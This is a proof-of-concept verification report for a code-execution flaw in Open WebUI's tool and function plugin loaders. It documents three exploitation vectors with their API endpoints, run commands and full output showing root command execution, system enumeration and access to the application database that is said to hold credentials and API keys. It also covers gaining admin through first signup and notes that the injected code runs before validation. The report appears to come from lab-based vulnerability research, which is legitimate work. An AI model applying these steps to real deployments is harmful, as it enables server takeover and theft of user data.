# PoC Verification Report: CVE-2026-0766

## CVE ID
CVE-2026-0766

## Vulnerability
Open WebUI `load_tool_module_by_id()` / `load_function_module_by_id()` Arbitrary Code Execution via `exec()` on user-supplied Python content.

## Verification Status
**CONFIRMED** — All three attack vectors successfully demonstrated Remote Code Execution as root (UID 0) inside the container.

---

## PoC Scripts

| Script | Path | Vector | Status |
|--------|------|--------|--------|
| `poc.py` | `poc/poc.py` | Tool Creation (Primary) | ✅ CONFIRMED |
| `poc_vector2_functions.py` | `poc/poc_vector2_functions.py` | Function Creation | ✅ CONFIRMED |
| `poc_vector3_tool_update.py` | `poc/poc_vector3_tool_update.py` | Tool Update | ✅ CONFIRMED |

All scripts are self-contained Python 3 using only stdlib (`urllib`, `json`, `uuid`, `subprocess`). No external dependencies required.

---

## Vector 1: Tool Creation (Primary) — `poc.py`

### Description
Exploits `POST /api/v1/tools/create` to inject arbitrary Python code via the `content` field. The code is executed by `exec(content, module.__dict__)` in `load_tool_module_by_id()` at `plugin.py` line 101.

### Authentication
First user to sign up becomes admin automatically. Signup is enabled by default (`ENABLE_SIGNUP=True`).

### Command
```bash
python3 poc/poc.py localhost 8080
```

### Output
```
======================================================================
  CVE-2026-0766: Open WebUI Remote Code Execution
  Vector: Tool Creation (POST /api/v1/tools/create)
  Target: http://172.19.0.7:8080
======================================================================

[*] Checking target health at http://172.19.0.7:8080/health ...
[+] Target is up and healthy
[+] Open WebUI version: 0.6.32

[*] Attempting authentication...
[*]   Trying signin as admin@cveforge.lab...
[+] Signed in successfully as admin (existing account)

[*] Crafting malicious tool payload (id: poc_8dcf5cb1)...
[*]   Injected command: id && cat /etc/hostname && whoami
[*]   Sentinel file: /tmp/cve-2026-0766-poc-proof
[*] Sending exploit payload to /api/v1/tools/create ...
[+] Tool created successfully (HTTP 200)
[+] The exec() call has executed our injected Python code

[*] Verifying code execution...

======================================================================
  EXPLOITATION SUCCESSFUL — Remote Code Execution Confirmed
======================================================================

  Sentinel file contents:
    CVE-2026-0766-RCE-CONFIRMED
    Command: id && cat /etc/hostname && whoami
    Output: uid=0(root) gid=0(root) groups=0(root)
    19ed6b673d61
    root

    UID: uid=0(root) gid=0(root) groups=0(root)
    Hostname: 19ed6b673d61

[+] CVE-2026-0766 CONFIRMED: Arbitrary code execution via tool creation
[+] Proof file: /tmp/cve-2026-0766-poc-proof inside container cve-2026-0766-vulnerable
```

### Vulnerability Demonstrated
- Arbitrary Python code execution on the server
- Running as root (UID 0) inside the Docker container
- Full OS command execution via `subprocess.run()`
- File write capability to arbitrary paths

---

## Vector 2: Function Creation — `poc_vector2_functions.py`

### Description
Exploits `POST /api/v1/functions/create` to inject code via the parallel `load_function_module_by_id()` function at `plugin.py` line 145. This is a **different code path** from Vector 1, targeting the functions API instead of the tools API. Functions require a `Pipe`, `Pipeline`, or `Filter` class instead of `Tools`.

### Key Differences from Vector 1
- Different API endpoint (`/api/v1/functions/create` vs `/api/v1/tools/create`)
- Different vulnerable function (`load_function_module_by_id` vs `load_tool_module_by_id`)
- Admin-only endpoint (`get_admin_user` dependency) — cannot be exploited by non-admin users even with `workspace.tools` permission
- Requires `Pipe`/`Pipeline`/`Filter` class instead of `Tools` class

### Command
```bash
python3 poc_vector2_functions.py 172.19.0.7 8080
```

### Output
```
======================================================================
  CVE-2026-0766: Open WebUI RCE — Vector 2 (Functions API)
  Endpoint: POST /api/v1/functions/create
  Vulnerable fn: load_function_module_by_id() at plugin.py:145
  Target: http://172.19.0.7:8080
======================================================================

[*] Checking target...
[+] Target is up
[*] Authenticating...
[+] Signed in as admin

[*] Crafting malicious function payload (id: poc_func_24b480d4)...
[*] Sending payload to /api/v1/functions/create ...
[*] Server response: HTTP 200
[*] Response (truncated): {
  "id": "poc_func_24b480d4",
  "user_id": "8ec20fcb-6134-4e21-861a-b75891aa3880",
  "type": "pipe",
  "name": "CVE-2026-0766 Functions PoC",
  ...
}

[*] Verifying code execution...
======================================================================
  EXPLOITATION SUCCESSFUL — Functions API RCE Confirmed
======================================================================

  Sentinel file contents:
    CVE-2026-0766-FUNCTIONS-RCE
    Vector: Functions API (POST /api/v1/functions/create)
    Vulnerable fn: load_function_module_by_id() at plugin.py:145
    Command: id && uname -a && cat /etc/os-release | head -5
    Output:
    uid=0(root) gid=0(root) groups=0(root)
    Linux 19ed6b673d61 6.12.69-linuxkit #1 SMP Mon Feb 16 11:19:06 UTC 2026 aarch64 GNU/Linux
    PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
    NAME="Debian GNU/Linux"
    VERSION_ID="12"
    VERSION="12 (bookworm)"
    VERSION_CODENAME=bookworm

    UID: uid=0(root) gid=0(root) groups=0(root)

[+] CVE-2026-0766 Vector 2 CONFIRMED: RCE via load_function_module_by_id()
```

### Vulnerability Demonstrated
- Code execution through the parallel `load_function_module_by_id()` code path
- System information disclosure (kernel version, OS details)
- Confirms both exec() calls in plugin.py are exploitable

---

## Vector 3: Tool Update — `poc_vector3_tool_update.py`

### Description
First creates a **benign** tool (no malicious code), then **updates** it with malicious content via `POST /api/v1/tools/id/{id}/update`. This demonstrates that:
1. Existing tools can be weaponized post-creation
2. The update code path is independently vulnerable
3. The malicious code persists in the database and re-executes on cache miss or tool listing

### Key Differences from Vectors 1 & 2
- Two-step attack: benign creation → malicious update
- Different endpoint (`/api/v1/tools/id/{id}/update`)
- Different permission model (tool owner, write access, or admin)
- Demonstrates persistent threat: compromised tools remain in DB

### Command
```bash
python3 poc_vector3_tool_update.py 172.19.0.7 8080
```

### Output
```
======================================================================
  CVE-2026-0766: Open WebUI RCE — Vector 3 (Tool Update)
  Endpoint: POST /api/v1/tools/id/{id}/update
  Target: http://172.19.0.7:8080
======================================================================

[*] Checking target...
[+] Target is up
[*] Authenticating...
[+] Signed in as admin

[*] Creating benign tool (id: benign_dac5a8ea)...
[+] Benign tool created successfully (id: benign_dac5a8ea)

[*] Now UPDATING the tool with malicious content...
[*] This demonstrates the tool update attack vector
[*] Endpoint: POST /api/v1/tools/id/benign_dac5a8ea/update
[+] Tool updated with malicious content (HTTP 200)

[*] Verifying code execution...
======================================================================
  EXPLOITATION SUCCESSFUL — Tool Update RCE Confirmed
======================================================================

  Sentinel file contents:
    CVE-2026-0766-UPDATE-RCE
    Vector: Tool Update (POST /api/v1/tools/id/benign_dac5a8ea/update)
    Tool ID: benign_dac5a8ea
    Note: This tool was initially BENIGN and was weaponized via update
    Command output:
    uid=0(root) gid=0(root) groups=0(root)
    /app/backend
    total 288
    drwxr-xr-x 5 root root   4096 Mar  1 03:49 .
    drwxr-xr-x 1 root root   4096 Sep 29 06:13 ..
    drwxr-xr-x 9 root root   4096 Mar  1 03:49 cache
    drwxr-xr-x 2 root root   4096 Mar  1 03:44 uploads
    drwxr-xr-x 2 root root   4096 Mar  1 03:44 vector_db
    -rw-r--r-- 1 root root 270336 Mar  1 03:49 webui.db

    UID: uid=0(root) gid=0(root) groups=0(root)
    SQLite DB exists: True
    SQLite DB size: 270336 bytes

[+] CVE-2026-0766 Vector 3 CONFIRMED: RCE via tool update endpoint
[+] A benign tool was successfully weaponized through the update API
```

### Vulnerability Demonstrated
- Benign tool successfully weaponized through update API
- Directory listing of application data directory
- SQLite database access confirmed (270,336 bytes at `/app/backend/data/webui.db`)
- Demonstrates post-compromise persistence scenario

---

## Summary of Findings

### Execution Context
- **User**: root (UID 0, GID 0)
- **OS**: Debian GNU/Linux 12 (bookworm)
- **Kernel**: Linux 6.12.69-linuxkit aarch64
- **Application path**: `/app/backend`

### Attack Surface Confirmed
| Entry Point | API Endpoint | Vulnerable Function | Auth Required | Status |
|-------------|-------------|---------------------|---------------|--------|
| Tool Create | `POST /api/v1/tools/create` | `load_tool_module_by_id()` line 101 | Admin or workspace.tools | ✅ CONFIRMED |
| Function Create | `POST /api/v1/functions/create` | `load_function_module_by_id()` line 145 | Admin only | ✅ CONFIRMED |
| Tool Update | `POST /api/v1/tools/id/{id}/update` | `load_tool_module_by_id()` line 101 | Owner/write/admin | ✅ CONFIRMED |

### Impact Demonstrated
1. **Arbitrary OS command execution** as root
2. **File system access**: Read/write to any path in the container
3. **Database access**: SQLite DB containing all user credentials, chat histories, API keys
4. **System information disclosure**: Kernel version, OS details, hostname
5. **Persistence**: Malicious code stored in database, re-executed on tool load

### Pre-Exploitation Requirements
- Network access to Open WebUI instance (port 8080)
- Signup enabled (default: `ENABLE_SIGNUP=True`)
- Fresh instance: first signup = admin (zero prior access needed)
- Existing instance: admin credentials or user with `workspace.tools` permission

### No Patch Available
As of v0.8.5 (latest), the `exec(content, module.__dict__)` call persists in both `load_tool_module_by_id()` and `load_function_module_by_id()`. The ZDI advisory (ZDI-26-032) recommends network access restriction as the only mitigation.

---

## Lab Environment

- **Container**: `cve-2026-0766-vulnerable`
- **Image**: `ghcr.io/open-webui/open-webui:v0.6.32`
- **Container IP**: `172.19.0.7`
- **Port**: 8080
- **Network**: `lab-net`
- **Credentials**: `admin@cveforge.lab` / `LabPass123` (admin)

---

## Notes

- All three PoC scripts use only Python stdlib (no external dependencies)
- Each script handles both signin (existing instance) and signup (fresh instance) scenarios
- Tool IDs use UUID suffixes to avoid "ID taken" conflicts on repeated runs
- The `Tools` / `Pipe` class is included in payloads to get clean HTTP 200 responses, but code executes regardless (the exec() runs before class validation)
- Even if the API returns an error after exec(), the injected code has already executed
- The vulnerability is architectural — Open WebUI is designed to execute user-provided Python code; the flaw is the lack of any sandboxing or restrictions
